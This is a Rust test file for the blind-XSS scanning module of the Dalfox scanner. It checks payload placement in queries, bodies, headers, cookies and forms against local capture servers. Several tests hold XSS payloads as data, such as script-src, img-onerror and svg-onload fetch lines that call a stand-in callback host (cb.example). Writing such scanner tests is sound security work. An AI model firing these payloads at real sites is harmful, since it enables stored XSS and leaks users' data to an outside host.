use super::*;
use axum::{
    Router,
    body::{Body, to_bytes},
    extract::State,
    http::{Request, StatusCode},
    response::{Html, IntoResponse},
    routing::{any, get},
};
use std::collections::HashMap;
use std::net::{Ipv4Addr, SocketAddr};
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::time::{Duration, sleep};

#[derive(Clone, Debug)]
struct CapturedRequest {
    method: String,
    uri: String,
    headers: HashMap<String, String>,
    /// Every value per (lowercased) name, in wire order. `headers` keeps only
    /// the last one, which hides a duplicated header.
    header_values: HashMap<String, Vec<String>>,
    body: String,
}

type CaptureState = Arc<Mutex<Vec<CapturedRequest>>>;

async fn capture_handler(
    State(state): State<CaptureState>,
    request: Request<Body>,
) -> impl IntoResponse {
    let (parts, body) = request.into_parts();
    let bytes = to_bytes(body, usize::MAX).await.unwrap_or_default();
    let mut headers = HashMap::new();
    let mut header_values: HashMap<String, Vec<String>> = HashMap::new();
    for (name, value) in &parts.headers {
        let name = name.as_str().to_ascii_lowercase();
        let value = value.to_str().unwrap_or_default().to_string();
        header_values
            .entry(name.clone())
            .or_default()
            .push(value.clone());
        headers.insert(name, value);
    }

    state.lock().await.push(CapturedRequest {
        method: parts.method.to_string(),
        uri: parts.uri.to_string(),
        headers,
        header_values,
        body: String::from_utf8_lossy(&bytes).to_string(),
    });
    StatusCode::OK
}

async fn start_capture_server() -> (SocketAddr, CaptureState) {
    let state: CaptureState = Arc::new(Mutex::new(Vec::new()));
    let app = Router::new()
        .route("/", any(capture_handler))
        .route("/submit", any(capture_handler))
        .with_state(state.clone());

    let listener = tokio::net::TcpListener::bind((Ipv4Addr::LOCALHOST, 0))
        .await
        .expect("bind listener");
    let addr = listener.local_addr().expect("listener addr");

    tokio::spawn(async move {
        let _ = axum::serve(listener, app).await;
    });

    sleep(Duration::from_millis(30)).await;
    (addr, state)
}

fn make_target(addr: SocketAddr, path: &str) -> Target {
    let target = format!("http://{}:{}{}", addr.ip(), addr.port(), path);
    crate::target_parser::parse_target(&target).expect("valid target")
}

#[tokio::test]
async fn test_send_blind_request_query_injects_payload_and_keeps_existing_state() {
    let (addr, state) = start_capture_server().await;
    let mut target = make_target(addr, "/?q=seed&keep=1");
    target.headers = vec![("X-Test".to_string(), "header".to_string())];
    target.cookies = vec![("sid".to_string(), "abc".to_string())];
    target.user_agent = Some("dalfox-test".to_string());
    target.delay = 1;

    send_blind_request(&target, "q", "PAYLOAD", "query").await;

    let records = state.lock().await.clone();
    assert_eq!(records.len(), 1);
    let req = &records[0];
    assert_eq!(req.method, "GET");
    assert!(req.uri.contains("q=PAYLOAD"));
    assert!(req.uri.contains("keep=1"));
    assert_eq!(
        req.headers.get("x-test").map(String::as_str),
        Some("header")
    );
    assert_eq!(
        req.headers.get("user-agent").map(String::as_str),
        Some("dalfox-test")
    );
    assert!(
        req.headers
            .get("cookie")
            .map(|v| v.contains("sid=abc"))
            .unwrap_or(false)
    );
}

#[tokio::test]
async fn test_send_blind_request_query_appends_when_param_missing() {
    let (addr, state) = start_capture_server().await;
    let target = make_target(addr, "/?keep=1");

    send_blind_request(&target, "q", "PAYLOAD", "query").await;

    let records = state.lock().await.clone();
    assert_eq!(records.len(), 1);
    let req = &records[0];
    assert!(req.uri.contains("keep=1"));
    assert!(req.uri.contains("q=PAYLOAD"));
}

#[tokio::test]
async fn test_send_blind_request_mutates_body_header_and_cookie_targets() {
    let (addr, state) = start_capture_server().await;
    let mut target = make_target(addr, "/submit");
    target.method = "POST".to_string();
    target.data = Some("a=1&b=2".to_string());
    target.headers = vec![("X-Trace".to_string(), "old".to_string())];
    target.cookies = vec![("session".to_string(), "old".to_string())];

    send_blind_request(&target, "a", "BODYPAY", "body").await;
    send_blind_request(&target, "X-Trace", "HDRPAY", "header").await;
    send_blind_request(&target, "session", "CKPAY", "cookie").await;

    let records = state.lock().await.clone();
    assert_eq!(records.len(), 3);
    assert_eq!(records[0].method, "POST");
    // Exact body, not a substring: the old naive replace produced the corrupt
    // `a=BODYPAY&1&b=2` (orphaned `&1`), which a `contains("a=BODYPAY")` check
    // wrongly accepted. The other pair must survive untouched.
    assert_eq!(records[0].body, "a=BODYPAY&b=2");
    assert_eq!(
        records[1].headers.get("x-trace").map(String::as_str),
        Some("HDRPAY")
    );
    assert!(
        records[2]
            .headers
            .get("cookie")
            .map(|v| v.contains("session=CKPAY"))
            .unwrap_or(false)
    );
}

#[tokio::test]
async fn test_send_blind_request_body_does_not_corrupt_substring_colliding_param() {
    // `id` must not also rewrite `userid` (the old substring `str::replace`
    // injected into both, landing the blind payload in the wrong sink).
    let (addr, state) = start_capture_server().await;
    let mut target = make_target(addr, "/submit");
    target.method = "POST".to_string();
    target.data = Some("id=1&userid=2".to_string());

    send_blind_request(&target, "id", "BODYPAY", "body").await;

    let records = state.lock().await.clone();
    assert_eq!(records.len(), 1);
    assert_eq!(records[0].body, "id=BODYPAY&userid=2");
}

#[tokio::test]
async fn test_send_blind_request_body_replaces_non_first_param_only() {
    // Injecting a middle param must leave the surrounding pairs intact.
    let (addr, state) = start_capture_server().await;
    let mut target = make_target(addr, "/submit");
    target.method = "POST".to_string();
    target.data = Some("a=1&b=2&c=3".to_string());

    send_blind_request(&target, "b", "BODYPAY", "body").await;

    let records = state.lock().await.clone();
    assert_eq!(records.len(), 1);
    assert_eq!(records[0].body, "a=1&b=BODYPAY&c=3");
}

#[tokio::test]
async fn test_send_blind_request_unknown_param_type_falls_back_to_default_path() {
    let (addr, state) = start_capture_server().await;
    let target = make_target(addr, "/");

    send_blind_request(&target, "unused", "PAYLOAD", "unknown-type").await;

    let records = state.lock().await.clone();
    assert_eq!(records.len(), 1);
    assert_eq!(records[0].uri, "/");
}

async fn start_form_server(html: &'static str) -> (SocketAddr, CaptureState) {
    let state: CaptureState = Arc::new(Mutex::new(Vec::new()));
    let app = Router::new()
        .route("/", get(move || async move { Html(html) }))
        .route("/submit", any(capture_handler))
        .route("/other", any(capture_handler))
        .with_state(state.clone());

    let listener = tokio::net::TcpListener::bind((Ipv4Addr::LOCALHOST, 0))
        .await
        .expect("bind listener");
    let addr = listener.local_addr().expect("listener addr");

    tokio::spawn(async move {
        let _ = axum::serve(listener, app).await;
    });

    sleep(Duration::from_millis(30)).await;
    (addr, state)
}

#[tokio::test]
async fn test_blind_scan_forms_posts_payload_for_same_origin_post_form() {
    static HTML: &str = r#"<html><body>
        <form method="POST" action="/submit">
            <input name="user" value="alice">
            <input name="msg" value="hi">
        </form>
    </body></html>"#;
    let (addr, state) = start_form_server(HTML).await;
    let target = make_target(addr, "/");

    blind_scan_forms(&target, "https://cb.example", None).await;

    let records = state.lock().await.clone();
    // Two text fields -> two POSTs, one with payload in `user`, one in `msg`.
    assert_eq!(records.len(), 2);
    assert!(records.iter().all(|r| r.method == "POST"));
    assert!(records.iter().all(|r| r.uri == "/submit"));
    assert!(records.iter().all(|r| {
        r.headers
            .get("content-type")
            .map(|v| v.contains("application/x-www-form-urlencoded"))
            .unwrap_or(false)
    }));
    // Each request carries the callback URL somewhere in the body.
    // form_urlencoded::byte_serialize leaves '.' alone, so the literal host
    // string is what we expect to see on the wire.
    assert!(records.iter().all(|r| r.body.contains("cb.example")));
    // Payload should land in each field exactly once across the two requests.
    let user_hits = records
        .iter()
        .filter(|r| {
            let user_part = r.body.split('&').find(|p| p.starts_with("user="));
            user_part.map(|p| p.contains("cb.example")).unwrap_or(false)
        })
        .count();
    let msg_hits = records
        .iter()
        .filter(|r| {
            let msg_part = r.body.split('&').find(|p| p.starts_with("msg="));
            msg_part.map(|p| p.contains("cb.example")).unwrap_or(false)
        })
        .count();
    assert_eq!(user_hits, 1);
    assert_eq!(msg_hits, 1);
}

#[tokio::test]
async fn test_blind_scan_forms_skips_get_forms() {
    static HTML: &str = r#"<html><body>
        <form method="GET" action="/submit">
            <input name="q" value="seed">
        </form>
    </body></html>"#;
    let (addr, state) = start_form_server(HTML).await;
    let target = make_target(addr, "/");

    blind_scan_forms(&target, "https://cb.example", None).await;

    let records = state.lock().await.clone();
    // The form-bearing GET / is handled by a static Html route (not captured).
    // No requests should ever reach the capture handler for a GET form.
    assert!(records.is_empty(), "unexpected requests: {:?}", records);
}

#[tokio::test]
async fn test_blind_scan_forms_skips_cross_origin_action() {
    static HTML: &str = r#"<html><body>
        <form method="POST" action="https://evil.example/x">
            <input name="user" value="alice">
        </form>
    </body></html>"#;
    let (addr, state) = start_form_server(HTML).await;
    let target = make_target(addr, "/");

    blind_scan_forms(&target, "https://cb.example", None).await;

    let records = state.lock().await.clone();
    // Cross-origin action should be skipped; nothing posted to /submit.
    assert!(records.iter().all(|r| r.method != "POST"));
}

#[tokio::test]
async fn test_blind_scan_forms_preserves_hidden_csrf_and_skips_hidden_rotation() {
    static HTML: &str = r#"<html><body>
        <form method="POST" action="/submit">
            <input type="hidden" name="_csrf" value="tok123">
            <input name="user" value="alice">
        </form>
    </body></html>"#;
    let (addr, state) = start_form_server(HTML).await;
    let target = make_target(addr, "/");

    blind_scan_forms(&target, "https://cb.example", None).await;

    let records = state.lock().await.clone();
    // Exactly one POST: the `user` field rotates in, the hidden _csrf is not
    // rotated (so it never receives the payload), but its original value is
    // preserved in every emitted body.
    assert_eq!(records.len(), 1);
    let req = &records[0];
    assert_eq!(req.method, "POST");
    // CSRF token survives intact.
    assert!(
        req.body.contains("_csrf=tok123"),
        "csrf token missing: {}",
        req.body
    );
    // Payload landed in `user` and not in `_csrf`.
    let csrf_part = req.body.split('&').find(|p| p.starts_with("_csrf="));
    let user_part = req.body.split('&').find(|p| p.starts_with("user="));
    assert!(
        csrf_part
            .map(|p| !p.contains("cb.example"))
            .unwrap_or(false)
    );
    assert!(user_part.map(|p| p.contains("cb.example")).unwrap_or(false));
}

#[tokio::test]
async fn test_blind_scan_forms_uses_get_to_fetch_even_when_target_is_post() {
    static HTML: &str = r#"<html><body>
        <form method="POST" action="/submit">
            <input name="user" value="alice">
        </form>
    </body></html>"#;
    let (addr, state) = start_form_server(HTML).await;
    // Configure the target as POST with body data; the fetch step must still
    // GET the form-bearing page rather than echoing the target's method.
    let mut target = make_target(addr, "/");
    target.method = "POST".to_string();
    target.data = Some("seed=1".to_string());

    blind_scan_forms(&target, "https://cb.example", None).await;

    let records = state.lock().await.clone();
    // The only request we capture is the form POST to /submit.
    // (The HTML GET to "/" is served by the static Html handler.)
    assert_eq!(records.len(), 1);
    assert_eq!(records[0].method, "POST");
    assert_eq!(records[0].uri, "/submit");
}

#[tokio::test]
async fn test_blind_scan_forms_overrides_caller_content_type() {
    static HTML: &str = r#"<html><body>
        <form method="POST" action="/submit">
            <input name="user" value="alice">
        </form>
    </body></html>"#;
    let (addr, state) = start_form_server(HTML).await;
    let mut target = make_target(addr, "/");
    // Caller-supplied Content-Type would otherwise be appended alongside our
    // urlencoded type. Verify it does NOT make it onto the form POST.
    target.headers = vec![("Content-Type".to_string(), "application/json".to_string())];

    blind_scan_forms(&target, "https://cb.example", None).await;

    let records = state.lock().await.clone();
    assert_eq!(records.len(), 1);
    let ct = records[0]
        .headers
        .get("content-type")
        .cloned()
        .unwrap_or_default();
    assert!(
        ct.contains("application/x-www-form-urlencoded"),
        "content-type missing urlencoded: {}",
        ct
    );
    assert!(
        !ct.contains("application/json"),
        "caller content-type leaked: {}",
        ct
    );
}

#[tokio::test]
async fn test_blind_scan_forms_skips_multipart() {
    static HTML: &str = r#"<html><body>
        <form method="POST" action="/submit" enctype="multipart/form-data">
            <input name="file" value="">
        </form>
    </body></html>"#;
    let (addr, state) = start_form_server(HTML).await;
    let target = make_target(addr, "/");

    blind_scan_forms(&target, "https://cb.example", None).await;

    let records = state.lock().await.clone();
    assert!(records.iter().all(|r| r.method != "POST"));
}

#[tokio::test]
async fn test_blind_scanning_sends_requests_for_query_body_header_and_cookie() {
    let (addr, state) = start_capture_server().await;
    let mut target = make_target(addr, "/?q=1");
    target.method = "POST".to_string();
    target.data = Some("bodyp=2".to_string());
    target.headers = vec![("x-h".to_string(), "v".to_string())];
    target.cookies = vec![("c".to_string(), "3".to_string())];

    blind_scanning(&target, "https://cb.example", None).await;

    let records = state.lock().await.clone();
    // 4 params (query, body, header, cookie) × every built-in template.
    assert_eq!(records.len(), 4 * crate::payload::XSS_BLIND_PAYLOADS.len());
    assert!(records.iter().all(|r| r.method == "POST"));
    assert!(records.iter().any(|r| {
        r.uri.contains("cb.example")
            || r.body.contains("cb.example")
            || r.headers.values().any(|v| v.contains("cb.example"))
    }));

    // The innerHTML DOM-sink vector must actually reach the wire, callback
    // filled in — an `<img onerror>` that requests the callback host. This is
    // the shape a stored DOM-XSS needs; a `<script src>` would be inert there.
    let all_payloads: String = records
        .iter()
        .map(|r| format!("{} {}", r.uri, r.body))
        .collect::<Vec<_>>()
        .join("\n");
    // Normalize the space encoding (form bodies use `+`, query strings `%20`)
    // so the assertion reads against the payload shape, not its wire encoding.
    let normalized = urlencoding::decode(&all_payloads)
        .map(|c| c.into_owned())
        .unwrap_or(all_payloads)
        .replace('+', " ");
    assert!(
        normalized.contains("<img src=x onerror=") && normalized.contains("cb.example"),
        "innerHTML DOM-sink blind payload not sent with callback; got:\n{}",
        normalized
    );
}

// ── pure-helper unit tests ──────────────────────────────────────────

#[test]
fn location_of_maps_param_types_to_wire_locations() {
    assert_eq!(location_of("query"), "Query");
    assert_eq!(location_of("body"), "Body");
    assert_eq!(location_of("header"), "Header");
    // Cookies fold into the Header location (a cookie side-channel POC).
    assert_eq!(location_of("cookie"), "Header");
    // Unknown tags map to the empty string rather than panicking.
    assert_eq!(location_of("unknown"), "");
}

fn injectable(html: &str, selector: &str) -> bool {
    let frag = scraper::Html::parse_fragment(html);
    let sel = scraper::Selector::parse(selector).expect("valid selector");
    let el = frag.select(&sel).next().expect("element present");
    is_injectable_input(&el)
}

#[test]
fn is_injectable_input_accepts_text_bearing_fields() {
    assert!(injectable("<textarea></textarea>", "textarea"));
    assert!(injectable("<input type=\"text\">", "input"));
    assert!(injectable("<input type=\"search\">", "input"));
    assert!(injectable("<input type=\"email\">", "input"));
    assert!(injectable("<input type=\"password\">", "input"));
    // Missing type attribute defaults to text.
    assert!(injectable("<input>", "input"));
}

#[test]
fn is_injectable_input_rejects_non_text_fields() {
    assert!(!injectable("<input type=\"hidden\">", "input"));
    assert!(!injectable("<input type=\"checkbox\">", "input"));
    assert!(!injectable("<input type=\"submit\">", "input"));
    assert!(!injectable("<input type=\"file\">", "input"));
    // <select> keeps its option choice rather than taking a payload.
    assert!(!injectable("<select><option>a</option></select>", "select"));
}

#[test]
fn build_send_payloads_static_substitutes_callback_url() {
    let source = CallbackSource::Static("https://cb.example/hook");
    let out = build_send_payloads(
        &source,
        "\"'><script src={callback}></script>",
        "https://target.example/",
        "q",
        "Query",
        "GET",
    );
    assert_eq!(out.len(), 1, "static source yields exactly one payload");
    assert_eq!(out[0], "\"'><script src=https://cb.example/hook></script>");
}

#[test]
fn build_blind_templates_falls_back_to_builtin_without_path() {
    let templates = build_blind_templates(None);
    assert!(!templates.is_empty());
    assert!(
        templates.iter().all(|t| t.contains(CALLBACK_MARKER)),
        "every built-in template carries the callback marker"
    );
    // The whole catalog reaches the wire — not just the first entry, which was
    // the prior behaviour that left the other shapes defined-but-unsent.
    assert_eq!(
        templates.len(),
        crate::payload::XSS_BLIND_PAYLOADS.len(),
        "default path must send every built-in blind shape"
    );
    assert!(
        templates
            .iter()
            .any(|t| t.contains("<img") && t.contains("onerror=")),
        "default path must include the innerHTML DOM-sink vector"
    );
}

fn tmp_template_file(name: &str, contents: &str) -> std::path::PathBuf {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("system time")
        .as_nanos();
    let mut p = std::env::temp_dir();
    p.push(format!(
        "dalfox-blind-tmpl-{}-{}-{}",
        std::process::id(),
        nanos,
        name
    ));
    std::fs::write(&p, contents).expect("write temp template");
    p
}

#[test]
fn build_blind_templates_reads_custom_lines_and_normalizes_marker() {
    let p = tmp_template_file(
        "custom",
        "# comment\n\n<img src={callback}>\n<svg onload=fetch('{callback}')>\n",
    );
    let templates = build_blind_templates(Some(p.to_str().unwrap()));
    let _ = std::fs::remove_file(&p);
    assert_eq!(templates.len(), 2, "comments and blank lines are dropped");
    assert_eq!(templates[0], "<img src={callback}>");
    assert_eq!(templates[1], "<svg onload=fetch('{callback}')>");
}

#[test]
fn build_blind_templates_drops_lines_without_callback_marker() {
    // Lines missing {callback} are skipped; the one valid line survives.
    let p = tmp_template_file("mixed", "<img src=x>\n<b>{callback}</b>\n");
    let templates = build_blind_templates(Some(p.to_str().unwrap()));
    let _ = std::fs::remove_file(&p);
    assert_eq!(templates, vec!["<b>{callback}</b>".to_string()]);
}

#[test]
fn build_blind_templates_falls_back_when_no_usable_lines() {
    let p = tmp_template_file("nouse", "no placeholder here\nanother bad line\n");
    let templates = build_blind_templates(Some(p.to_str().unwrap()));
    let _ = std::fs::remove_file(&p);
    // No usable line → built-in fallback (which carries the marker).
    assert!(!templates.is_empty());
    assert!(templates.iter().all(|t| t.contains(CALLBACK_MARKER)));
}

#[test]
fn build_blind_templates_falls_back_when_file_unreadable() {
    let templates = build_blind_templates(Some("/dalfox/no/such/blind/template.txt"));
    assert!(
        !templates.is_empty(),
        "unreadable path falls back to built-in"
    );
    assert!(templates.iter().all(|t| t.contains(CALLBACK_MARKER)));
}

/// `Some("")` is the "no UA override" sentinel every entry point sets when the
/// operator supplied none (`job::runner::hydrate_target`, `cmd::scan::input`).
/// `apply_headers_ua_cookies` has always empty-checked it; the blind-XSS
/// requests were the one path that did not, so they put a literal blank
/// `User-Agent:` on the wire — a fingerprint no ordinary client sends, on
/// exactly the requests meant to look ordinary.
#[tokio::test]
async fn test_send_blind_request_omits_user_agent_for_the_no_override_sentinel() {
    let (addr, state) = start_capture_server().await;
    let mut target = make_target(addr, "/?q=seed");
    target.user_agent = Some(String::new());

    send_blind_request(&target, "q", "PAYLOAD", "query").await;

    let records = state.lock().await.clone();
    assert_eq!(records.len(), 1);
    let ua = records[0].headers.get("user-agent").map(String::as_str);
    assert!(
        ua != Some(""),
        "the empty sentinel must not become a blank User-Agent header; saw {ua:?}"
    );
}

/// A custom template's own `{}` (an empty JS function body or object literal)
/// is not the callback marker: only `{callback}` is substituted. Normalizing
/// `{callback}` to the built-in `{}` used to replace both, so
/// `.catch(()=>{})` became `.catch(()=>https://…)` — a syntax error, and a
/// blind probe that could never call home.
#[test]
fn custom_template_literal_braces_survive_callback_substitution() {
    let p = tmp_template_file(
        "braces",
        "<script>fetch('{callback}').catch(()=>{})</script>\n",
    );
    let templates = build_blind_templates(Some(p.to_str().unwrap()));
    let _ = std::fs::remove_file(&p);
    assert_eq!(templates.len(), 1);

    let out = build_send_payloads(
        &CallbackSource::Static("https://cb.example/hook"),
        &templates[0],
        "https://target.example/",
        "q",
        "Query",
        "GET",
    );
    assert_eq!(
        out,
        vec!["<script>fetch('https://cb.example/hook').catch(()=>{})</script>".to_string()]
    );
}

/// `--user-agent X` puts `User-Agent: X` in `target.headers` *and* sets
/// `target.user_agent`. Injecting the blind payload into that header must put
/// the payload on the wire as the only User-Agent — not the payload followed by
/// a second `User-Agent: X`, which a server reading the last value logs instead.
#[tokio::test]
async fn test_send_blind_request_user_agent_injection_is_the_only_user_agent() {
    let (addr, state) = start_capture_server().await;
    let mut target = make_target(addr, "/");
    target.headers = vec![("User-Agent".to_string(), "X-Agent".to_string())];
    target.user_agent = Some("X-Agent".to_string());

    send_blind_request(&target, "User-Agent", "UAPAY", "header").await;
    send_blind_request(&target, "q", "QPAY", "query").await;

    let records = state.lock().await.clone();
    assert_eq!(records.len(), 2);
    assert_eq!(
        records[0].header_values.get("user-agent"),
        Some(&vec!["UAPAY".to_string()]),
        "header injection must replace the User-Agent, not add a second one"
    );
    assert_eq!(
        records[1].header_values.get("user-agent"),
        Some(&vec!["X-Agent".to_string()]),
        "a non-header injection must send the configured User-Agent once"
    );
}

/// A `-H "Cookie: …"` header wins over `--cookies`, as on every other request
/// path; the blind requests used to send both as two Cookie headers.
#[tokio::test]
async fn test_send_blind_request_sends_a_single_cookie_header() {
    let (addr, state) = start_capture_server().await;
    let mut target = make_target(addr, "/");
    target.headers = vec![("Cookie".to_string(), "sid=hdr".to_string())];
    target.cookies = vec![("theme".to_string(), "dark".to_string())];

    send_blind_request(&target, "q", "QPAY", "query").await;
    send_blind_request(&target, "theme", "CKPAY", "cookie").await;

    let records = state.lock().await.clone();
    assert_eq!(records.len(), 2);
    for r in &records {
        assert_eq!(
            r.header_values.get("cookie").map(Vec::len),
            Some(1),
            "exactly one Cookie header expected, got {:?}",
            r.header_values.get("cookie")
        );
    }
    assert!(records[1].headers["cookie"].starts_with("theme=CKPAY"));
}

/// Body names are matched after form-decoding, so a percent-encoded or
/// `+`-spaced name must be collected decoded too: the raw spelling never
/// matched, the real field went untouched, and a double-encoded
/// `user%255Bname%255D` field was appended instead.
#[tokio::test]
async fn test_blind_scanning_injects_percent_encoded_body_names_in_place() {
    let (addr, state) = start_capture_server().await;
    let mut target = make_target(addr, "/submit");
    target.method = "POST".to_string();
    target.data = Some("user%5Bname%5D=alice&first+name=bob".to_string());

    blind_scanning(&target, "https://cb.example/hook", None).await;

    let records = state.lock().await.clone();
    let bodies: Vec<&str> = records.iter().map(|r| r.body.as_str()).collect();
    assert!(
        bodies.iter().all(|b| !b.contains("%255B")),
        "no double-encoded field may be appended; got {bodies:?}"
    );
    assert!(
        bodies.iter().any(|b| b.starts_with("user%5Bname%5D=")
            && b.contains("cb.example")
            && b.ends_with("&first+name=bob")),
        "the bracketed field must carry the payload in place; got {bodies:?}"
    );
    assert!(
        bodies
            .iter()
            .any(|b| b.starts_with("user%5Bname%5D=alice&first+name=") && b.contains("cb.example")),
        "the `+`-spaced field must carry the payload in place; got {bodies:?}"
    );
}

/// The form-page fetch goes through the shared builder, which drops a caller
/// `Accept-Encoding` (a hand-set one disables reqwest's decompression and the
/// form page comes back as bytes no parser finds a form in).
#[tokio::test]
async fn test_blind_scan_forms_fetch_does_not_forward_accept_encoding() {
    let state: CaptureState = Arc::new(Mutex::new(Vec::new()));
    let app = Router::new()
        .route("/", any(capture_handler))
        .with_state(state.clone());
    let listener = tokio::net::TcpListener::bind((Ipv4Addr::LOCALHOST, 0))
        .await
        .expect("bind listener");
    let addr = listener.local_addr().expect("listener addr");
    tokio::spawn(async move {
        let _ = axum::serve(listener, app).await;
    });
    sleep(Duration::from_millis(30)).await;

    let mut target = make_target(addr, "/");
    target.headers = vec![("Accept-Encoding".to_string(), "x-caller".to_string())];

    blind_scan_forms(&target, "https://cb.example", None).await;

    let records = state.lock().await.clone();
    assert_eq!(records.len(), 1, "one GET for the form page");
    assert!(
        records[0]
            .header_values
            .get("accept-encoding")
            .is_none_or(|v| v.iter().all(|x| x != "x-caller")),
        "caller Accept-Encoding must not reach the form fetch: {:?}",
        records[0].header_values.get("accept-encoding")
    );
}

#[test]
fn looks_like_urlencoded_form_rejects_structured_bodies() {
    assert!(looks_like_urlencoded_form("a=1&b=2"));
    assert!(looks_like_urlencoded_form("user%5Bname%5D=x"));
    // JSON / GraphQL / XML are not forms, even with an `=` inside a value.
    assert!(!looks_like_urlencoded_form(r#"{"next":"/a?x=1"}"#));
    assert!(!looks_like_urlencoded_form("  [\"a=b\"]"));
    assert!(!looks_like_urlencoded_form("<q>a=b</q>"));
    // No `=` at all: nothing to enumerate.
    assert!(!looks_like_urlencoded_form("opaquetoken"));
}

/// A JSON body must not be split on `&`/`=` into a garbage field: that invented
/// a bogus param name and re-serialized the request into a corrupt form.
#[tokio::test]
async fn test_blind_scanning_skips_a_json_body() {
    let (addr, state) = start_capture_server().await;
    let mut target = make_target(addr, "/submit");
    target.method = "POST".to_string();
    target.data = Some(r#"{"next":"/a?x=1"}"#.to_string());

    blind_scanning(&target, "https://cb.example/hook", None).await;

    let records = state.lock().await.clone();
    // Query has no params and the JSON body yields none, so no body-injection
    // requests go out; any request that did must still carry the JSON verbatim,
    // never a re-serialized `{"next"...=...` form field.
    for r in &records {
        assert!(
            !r.body.contains("%7B%22next%22"),
            "JSON body was re-serialized as a form field: {}",
            r.body
        );
    }
}
